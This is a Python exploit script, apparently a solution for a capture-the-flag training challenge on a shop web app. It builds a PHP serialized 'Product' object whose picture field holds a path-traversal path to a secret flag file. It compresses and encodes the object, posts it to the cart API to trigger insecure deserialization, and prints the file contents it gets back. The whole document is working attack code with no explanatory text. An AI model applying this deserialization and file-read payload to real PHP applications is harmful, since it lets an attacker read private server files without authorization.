import requests
import random
import string
import zlib
import base64

base_url = "http://lolshop.training.jinblack.it"

def random_string(n):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

def create_session(name, email, s):
    url = "%s/api/new_session.php" % base_url
    data = {"name": name, "email": email}
    response = s.post(url, data=data)
    return response.json()

def add_to_cart(state, product_id, s):
    url = "%s/api/add_to_cart.php" % base_url
    data = {"state": state, "product": product_id}
    response = s.post(url, data = data)

def share_as_wishlist(state, save, s):
    url = "%s/api/cart.php" % base_url
    data = {"state": state, "save": ''}
    response = s.post(url, data=data)
    return response.json()

def simulate_serialization(prod_serialized:string):
    s = zlib.compress(prod_serialized.encode())
    return base64.b64encode(s)


s = requests.Session()
name = random_string(6)
email = random_string(6)
r = create_session(name, email, s)
state = r["state"]
session_id = r["session_id"]
ser = 'O:7:"Product":5:{s:2:"id";i:9;s:4:"name";s:4:"Zeal";s:11:"description";s:4:"flag";s:7:"picture";s:24:"../../../secret/flag.txt";s:5:"price";i:2000;}' #created with online tools to serialize
ser_object = simulate_serialization(ser)

r = share_as_wishlist(ser_object, '', s)
url = f"{base_url}/api/cart.php"
data = {"token": r['token']}
response = requests.post(url, data=data)
response = response.json()
print(base64.b64decode(response['picture']))